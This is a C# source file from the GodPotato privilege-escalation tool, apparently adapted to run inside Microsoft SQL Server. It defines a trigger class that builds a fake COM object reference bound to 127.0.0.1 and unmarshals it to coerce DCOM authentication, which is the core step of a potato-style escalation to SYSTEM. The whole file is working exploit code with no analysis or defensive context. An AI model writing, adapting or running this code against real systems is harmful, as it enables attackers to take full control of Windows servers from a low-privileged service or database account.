using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using Microsoft.SqlServer.Server;

namespace GodPotato.NativeAPI{

    [ComVisible(true)]
    public class GodPotatoUnmarshalTrigger  {
        private readonly static Guid IID_IUnknown = new Guid("{00000000-0000-0000-C000-000000000046}");
        private readonly static string binding = "127.0.0.1";
        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;


        public object fakeObject = new object();
        public IntPtr pIUnknown;
        public IBindCtx bindCtx;
        public IMoniker moniker;

        private GodPotatoContext godPotatoContext;


        public GodPotatoUnmarshalTrigger(GodPotatoContext godPotatoContext) {
            this.godPotatoContext = godPotatoContext;


            if (!godPotatoContext.IsStart)
            {
                throw new Exception("GodPotatoContext was not initialized");
            }

            pIUnknown = Marshal.GetIUnknownForObject(fakeObject);
            NativeMethods.CreateBindCtx(0, out bindCtx);
            NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);

        }


        public int Trigger() {

            string ppszDisplayName;
            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);
            ppszDisplayName = ppszDisplayName.Replace("objref:", "").Replace(":", "");
            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);

            ObjRef tmpObjRef = new ObjRef(objrefBytes);

            SqlContext.Pipe.Send($"[*] DCOM obj GUID: {tmpObjRef.Guid}");
            SqlContext.Pipe.Send($"[*] DCOM obj IPID: {tmpObjRef.StandardObjRef.IPID}");
            SqlContext.Pipe.Send(String.Format("[*] DCOM obj OXID: 0x{0:x}", tmpObjRef.StandardObjRef.OXID));
            SqlContext.Pipe.Send(String.Format("[*] DCOM obj OID: 0x{0:x}", tmpObjRef.StandardObjRef.OID));
            SqlContext.Pipe.Send(String.Format("[*] DCOM obj Flags: 0x{0:x}", tmpObjRef.StandardObjRef.Flags));
            SqlContext.Pipe.Send(String.Format("[*] DCOM obj PublicRefs: 0x{0:x}", tmpObjRef.StandardObjRef.PublicRefs));

            ObjRef objRef = new ObjRef(IID_IUnknown,
                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,
                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));
            byte[] data = objRef.GetBytes();

            SqlContext.Pipe.Send($"[*] Marshal Object bytes len: {data.Length}");
            
            IntPtr ppv;

            SqlContext.Pipe.Send($"[*] UnMarshal Object");
            return UnmarshalDCOM.UnmarshalObject(data,out ppv);
        }


    }
}
